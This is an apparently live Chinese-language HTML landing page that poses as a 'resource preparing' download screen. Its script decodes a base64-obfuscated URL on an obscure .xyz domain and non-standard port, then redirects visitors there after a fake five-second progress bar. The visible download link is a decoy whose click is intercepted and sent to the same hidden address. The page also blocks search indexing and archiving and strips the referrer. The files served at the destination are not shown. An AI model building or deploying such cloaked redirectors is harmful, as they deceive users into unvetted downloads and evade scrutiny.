<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://tjc.net.cn/">
  <title>资源准备中</title>
  <style>
    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;color:#eef5ff;background:radial-gradient(circle at 70% 10%,#352778 0,transparent 34%),radial-gradient(circle at 8% 90%,#073d6e 0,transparent 34%),#050d20;font-family:"PingFang SC","Microsoft YaHei",sans-serif}.transfer-card{width:min(100%,520px);padding:42px 34px;text-align:center;border:1px solid rgba(132,181,255,.24);border-radius:26px;background:rgba(11,27,60,.82);box-shadow:0 30px 80px rgba(0,0,0,.36);backdrop-filter:blur(18px)}.transfer-icon{width:74px;height:74px;margin:0 auto 22px;border-radius:24px;display:grid;place-items:center;background:linear-gradient(135deg,#269dff,#795cff);box-shadow:0 15px 36px rgba(69,105,255,.38);font-size:30px}.transfer-card h1{margin:0 0 12px;font-size:30px}.transfer-card p{margin:7px 0;color:#aebfdb}.progress{height:9px;margin:28px 0 12px;overflow:hidden;border-radius:99px;background:rgba(145,178,235,.14)}.progress-bar{width:0;height:100%;border-radius:inherit;background:linear-gradient(90deg,#33cfff,#8c66ff);transition:width .18s linear;box-shadow:0 0 18px #4b9fff}.count{font-size:13px;color:#8198bc}.manual{display:inline-flex;align-items:center;justify-content:center;margin-top:24px;min-height:48px;padding:0 25px;border-radius:13px;color:#fff;background:linear-gradient(135deg,#269dff,#795cff);font-weight:700;text-decoration:none;box-shadow:0 12px 30px rgba(65,103,255,.3)}
  </style>
</head>
<body>
  <main class="transfer-card hero-card-tjc-net-govcn tjc.net-govcn">
    <div class="transfer-icon">↗</div>
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="progress" aria-label="跳转进度"><div class="progress-bar" id="progressBar"></div></div>
    <div class="count"><span id="countdown">5</span> 秒后自动跳转</div>
    <a class="manual download-btn-tjc-net-govcn tjc.net-govcn" id="manualDownload" href="/party.html" rel="nofollow noopener noreferrer">立即下载</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9rbjUuMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    const countdown = document.getElementById("countdown");
    const progressBar = document.getElementById("progressBar");
    const startedAt = Date.now();
    const duration = 5000;
    const timer = window.setInterval(function () {
      const elapsed = Date.now() - startedAt;
      const progress = Math.min(100, elapsed / duration * 100);
      progressBar.style.width = progress + "%";
      countdown.textContent = String(Math.max(0, Math.ceil((duration - elapsed) / 1000)));
      if (elapsed >= duration) {
        window.clearInterval(timer);
        window.location.replace(REAL_DOWNLOAD_URL);
      }
    }, 100);
    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
  </script>
</body>
</html>
